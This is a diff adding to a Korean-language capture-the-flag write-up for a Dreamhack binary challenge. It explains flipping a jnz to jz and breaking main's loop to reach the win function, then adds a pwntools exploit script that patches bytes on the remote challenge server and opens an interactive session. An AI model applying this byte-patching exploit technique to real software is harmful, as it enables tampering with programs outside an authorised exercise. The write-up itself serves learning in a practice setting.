@@ -7,6 +7,29 @@
 `jnz     short locret_11D8`
 여기서 `jnz`를 `jz`로 바꾸고 뛰는 값을 조절한 뒤, `main` 무한 반복을 풀어주면 `win` 함수를 호출할 수 있다.
 
-```
+브포로 딱 1바이트만 바꿔서 성공하신 분 제외하고는 익스 코드가 짧은 편에 속하는 것 같다.
+# exploit.py
 
+```python
+from pwn import *
+from time import *
+
+p = remote('host1.dreamhack.games', 14712)
+#p = process('./prob')
+
+p.sendlineafter(b': ', str(0x324).encode())
+p.sendlineafter(b': ', str((0x2b3 - 0x325) & 0xff).encode())
+
+sleep(1)
+p.sendline(str(0x1ab).encode())
+p.sendlineafter(b': ', str(0x74).encode())
+
+sleep(1)
+p.sendline(str(0x1ac).encode())
+p.sendlineafter(b': ', str(0xed - 0xab - 2).encode())
+
+sleep(1)
+p.sendline(str(0x324).encode())
+p.sendlineafter(b': ', str(0x5).encode())
+p.interactive()
 ```
